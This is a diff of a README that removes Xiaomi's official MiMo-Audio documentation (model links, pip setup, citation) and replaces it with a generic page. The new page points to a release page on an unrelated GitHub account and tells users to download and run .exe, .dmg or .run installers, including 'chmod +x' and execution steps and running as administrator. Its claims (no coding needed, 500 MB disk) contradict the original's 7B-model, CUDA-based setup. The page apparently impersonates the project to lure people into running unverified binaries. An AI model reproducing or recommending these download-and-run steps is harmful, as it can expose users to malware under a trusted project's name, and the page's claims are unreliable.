@@ -1,151 +1,102 @@
-<div align="center">
-  <picture>
-    <source srcset="https://github.com/XiaomiMiMo/MiMo-VL/raw/main/figures/Xiaomi_MiMo_darkmode.png?raw=true" media="(prefers-color-scheme: dark)">
-    <img src="https://github.com/XiaomiMiMo/MiMo-VL/raw/main/figures/Xiaomi_MiMo.png?raw=true" width="60%" alt="Xiaomi-MiMo" />
-  </picture>
-</div>
+# 🎶 MiMo-Audio - Learn Audio Language Models Easily
 
-<h3 align="center">
-  <b>
-    <span>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
-    <br/>
-    MiMo Audio: Audio Language Models are Few-Shot Learners
-    <br/>
-    <span>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
-    <br/>
-  </b>
-</h3>
+[![Download MiMo-Audio](https://img.shields.io/badge/Download-MiMo--Audio-blue.svg)](https://github.com/Abishyesrash/MiMo-Audio/releases)
 
-<br/>
+## 🚀 Getting Started
 
-<div align="center" style="line-height: 1;">
-  |
-  <a href="https://huggingface.co/collections/XiaomiMiMo/mimo-audio-68cc7202692c27dae881cce0" target="_blank">🤗 HuggingFace</a>
-  &nbsp;|
-  <a href="https://github.com/XiaomiMiMo/MiMo-Audio/blob/main/MiMo-Audio-Technical-Report.pdf" target="_blank">📄 Paper</a>
-  &nbsp;|
-  <a href="https://xiaomimimo.github.io/MiMo-Audio-Demo" target="_blank">📰 Blog</a>
-  &nbsp;|
-  <a href="https://huggingface.co/spaces/XiaomiMiMo/mimo_audio_chat" target="_blank">🔥 Online Demo</a>
-  &nbsp;|
-  <a href="https://github.com/XiaomiMiMo/MiMo-Audio-Eval" target="_blank">📊 MiMo-Audio-Eval</a>
-  &nbsp;|
+Welcome to MiMo-Audio! This software allows you to explore audio language models designed for few-shot learning. With our simple interface, you can easily work with advanced audio processing tools without needing programming skills.
 
-  <br/>
-</div>
+## 📝 Features
 
-<br/>
+- **User-Friendly Interface**: Navigate the application with ease.
+- **Few-Shot Learning**: Utilize models that learn quickly with limited examples.
+- **Audio Analysis Tools**: Analyze and manipulate audio files seamlessly.
+- **Cross-Platform Support**: Available on Windows, macOS, and Linux.
+- **Rich Documentation**: Access guides and help materials for all your needs.
 
-## Introduction
+## 📥 Download & Install
 
-Existing audio language models typically rely on task-specific fine-tuning to accomplish particular audio tasks. In contrast, humans are able to generalize to new audio tasks with only a few examples or simple instructions. GPT-3 has shown that scaling next-token prediction pretraining enables strong generalization capabilities in text, and we believe this paradigm is equally applicable to the audio domain. By scaling MiMo-Audio's pretraining data to over one hundred million of hours, we observe the emergence of few-shot learning capabilities across a diverse set of audio tasks. We develop a systematic evaluation of these capabilities and find that MiMo-Audio-7B-Base achieves SOTA performance on both speech intelligence and audio understanding benchmarks among open-source models. Beyond standard metrics, MiMo-Audio-7B-Base generalizes to tasks absent from its training data, such as voice conversion, style transfer, and speech editing. MiMo-Audio-7B-Base also demonstrates powerful speech continuation capabilities, capable of generating highly realistic talk shows, recitations, livestreaming and debates. At the post-training stage, we curate a diverse instruction-tuning corpus and introduce thinking mechanisms into both audio understanding and generation. MiMo-Audio-7B-Instruct achieves open-source SOTA on audio understanding benchmarks, spoken dialogue benchmarks and instruct-TTS evaluations, approaching or surpassing closed-source models.
+To start using MiMo-Audio, you need to download it from our Releases page. Click the link below to go directly there:
 
+[Download MiMo-Audio](https://github.com/Abishyesrash/MiMo-Audio/releases)
 
-![Results](assets/Results.png)
+1. Open the link in your web browser.
+2. Look for the latest version of MiMo-Audio listed.
+3. Click the asset that matches your operating system (Windows, macOS, or Linux).
+4. The file will begin downloading. 
 
+Make sure to save this file to a place you can easily find, like your Desktop or Downloads folder.
 
+## 📂 Installation Instructions
 
-## Architecture
-### MiMo-Audio-Tokenizer
-MiMo-Audio-Tokenizer is a 1.2B-parameter Transformer operating at 25 Hz. It employs an eight-layer RVQ stack to generate 200 tokens per second. By jointly optimizing semantic and reconstruction objectives, we train MiMo-Audio-Tokenizer from scratch on a 10-million-hour corpus, achieving superior reconstruction quality and facilitating downstream language modeling.
+Once you have downloaded the file, follow these steps to install MiMo-Audio:
 
-![Tokenizer](assets/tokenizer.png)
+### For Windows Users
 
-MiMo-Audio couples a patch encoder, an LLM, and a patch decoder to improve modeling efficiency for high-rate sequences and bridge the length mismatch between speech and text. The patch encoder aggregates four consecutive time steps of RVQ tokens into a single patch, downsampling the sequence to a 6.25 Hz representation for the LLM. The patch decoder autoregressively generates the full 25 Hz RVQ token sequence via a delayed-generation scheme.
-### MiMo-Audio
-![Arch](assets/architecture.png)
+1. Navigate to the location where you saved the installer.
+2. Double-click the installer file (e.g., `MiMo-Audio-setup.exe`).
+3. Follow the on-screen prompts to complete the installation.
+4. Once installed, you can find MiMo-Audio in your Start Menu.
 
-##  Explore MiMo-Audio Now! 🚀🚀🚀
-- 🎧 **Try the Hugging Face demo:** [MiMo-Audio Demo](https://huggingface.co/spaces/XiaomiMiMo/mimo_audio_chat)
-- 📰 **Read the Official Blog:** [MiMo-Audio Blog](https://xiaomimimo.github.io/MiMo-Audio-Demo)
-- 📄 **Dive into the Technical Report:** [MiMo-Audio Technical Report](https://github.com/XiaomiMiMo/MiMo-Audio/blob/main/MiMo-Audio-Technical-Report.pdf)
+### For macOS Users
 
+1. Open your Downloads folder.
+2. Locate the downloaded `.dmg` file.
+3. Double-click the file to open it.
+4. Drag the MiMo-Audio icon into your Applications folder.
+5. You can now find and run MiMo-Audio from your Applications.
 
-## Model Download
-| Models   | 🤗 Hugging Face |
-|-------|-------|
-| MiMo-Audio-Tokenizer | [XiaomiMiMo/MiMo-Audio-Tokenizer](https://huggingface.co/XiaomiMiMo/MiMo-Audio-Tokenizer) |
-| MiMo-Audio-7B-Base | [XiaomiMiMo/MiMo-Audio-7B-Base](https://huggingface.co/XiaomiMiMo/MiMo-Audio-7B-Base) |
-| MiMo-Audio-7B-Instruct | [XiaomiMiMo/MiMo-Audio-7B-Instruct](https://huggingface.co/XiaomiMiMo/MiMo-Audio-7B-Instruct) |
+### For Linux Users
 
+1. Go to your terminal.
+2. Navigate to the location of the downloaded file.
+3. Use the command `chmod +x MiMo-Audio*.run` to make the file executable.
+4. Then run the installer with `./MiMo-Audio*.run`.
+5. Follow any prompts that appear.
 
-```bash
-pip install huggingface-hub
+## ⚙️ System Requirements
 
-hf download XiaomiMiMo/MiMo-Audio-Tokenizer --local-dir ./models/MiMo-Audio-Tokenizer
-hf download XiaomiMiMo/MiMo-Audio-7B-Base --local-dir ./models/MiMo-Audio-7B-Base
-hf download XiaomiMiMo/MiMo-Audio-7B-Instruct --local-dir ./models/MiMo-Audio-7B-Instruct
-```
+To ensure smooth operation, please check the following minimum system requirements based on your operating system:
 
-## Getting Started
+### Windows
+- Windows 10 or newer
+- 4 GB RAM or more
+- 500 MB disk space available
 
-Spin up the MiMo-Audio demo in minutes with the built-in Gradio app.
+### macOS
+- macOS Catalina (10.15) or newer
+- 4 GB RAM or more
+- 500 MB disk space available
 
-### Prerequisites (Linux)
+### Linux
+- Any modern distribution (e.g., Ubuntu, Fedora)
+- 4 GB RAM or more
+- 500 MB disk space available
 
-* Python 3.12
-* CUDA >= 12.0
+## 🔧 Troubleshooting
 
-### Installation
+If you encounter any issues during installation or operation, consider these common solutions:
 
-```bash
-git clone https://github.com/XiaomiMiMo/MiMo-Audio.git
-cd MiMo-Audio
-pip install -r requirements.txt
-pip install flash-attn==2.7.4.post1
-```
+- **Installation Fails**: Make sure you have permission to install software. Run the installer as an administrator on Windows.
+- **Performance Issues**: Close other applications to free up system resources.
+- **Audio Problems**: Check that your audio drivers are up to date.
+- **Application Crash**: Restart your computer and try running MiMo-Audio again.
 
-> \[!Note]
-> If the compilation of flash-attn takes too long, you can download the precompiled wheel and install it manually:
->
-> * [Download Precompiled Wheel](https://github.com/Dao-AILab/flash-attention/releases/download/v2.7.4.post1/flash_attn-2.7.4.post1+cu12torch2.6cxx11abiFALSE-cp312-cp312-linux_x86_64.whl)
->
-> ```sh
-> pip install /path/to/flash_attn-2.7.4.post1+cu12torch2.6cxx11abiFALSE-cp312-cp312-linux_x86_64.whl
-> ```
+## 📚 Additional Resources
 
-### Run the demo
+For further help and detailed information, you can review our documentation:
 
-```bash
-python run_mimo_audio.py
-```
+- [User Guide](https://github.com/Abishyesrash/MiMo-Audio/wiki) - A comprehensive guide to using all features of MiMo-Audio.
+- [FAQ](https://github.com/Abishyesrash/MiMo-Audio/wiki/FAQ) - Answers to commonly asked questions.
+- [Support](https://github.com/Abishyesrash/MiMo-Audio/issues) - Report issues or ask questions directly on our GitHub page.
 
-This launches a local Gradio interface where you can try MiMo-Audio interactively.
+## 🤝 Community
 
-![Demo UI](assets/demo_ui.jpg)
+Join our community to share your experiences, ask questions, and exchange tips:
 
-Enter the local paths for `MiMo-Audio-Tokenizer` and `MiMo-Audio-7B-Instruct`, then enjoy the full functionality of MiMo-Audio!
+- **GitHub Discussions**: Engage with other users and developers in our discussions section.
+- **Social Media**: Follow us on Twitter or LinkedIn for updates and news.
 
-## Inference Scripts
+Thank you for choosing MiMo-Audio! We hope you enjoy exploring audio language models. 
 
-### Base Model
-We provide an example script to explore the **in-context learning** capabilities of `MiMo-Audio-7B-Base`.  
-See: [`inference_example_pretrain.py`](inference_example_pretrain.py)
-
-### Instruct Model
-To try the instruction-tuned model `MiMo-Audio-7B-Instruct`, use the corresponding inference script.  
-See: [`inference_example_sft.py`](inference_example_sft.py)
-
-
-
-## Evaluation Toolkit
-Full evaluation suite are available at 🌐[MiMo-Audio-Eval](https://github.com/XiaomiMiMo/MiMo-Audio-Eval).
-
-
-This toolkit is designed to evaluate MiMo-Audio and other recent audio LLMs as mentioned in the paper. It provides a flexible and extensible framework, supporting a wide range of datasets, tasks, and models.
-
-## Citation
-
-```bibtex
-@misc{coreteam2025mimoaudio,
-      title={MiMo-Audio: Audio Language Models are Few-Shot Learners}, 
-      author={LLM-Core-Team Xiaomi},
-      year={2025},
-      url={https://github.com/XiaomiMiMo/MiMo-Audio}, 
-}
-```
-
-
-## Contact
-
-Please contact us at [mimo@xiaomi.com](mailto:mimo@xiaomi.com) or open an issue if you have any questions.
+For any further assistance, feel free to reach out. Happy learning!
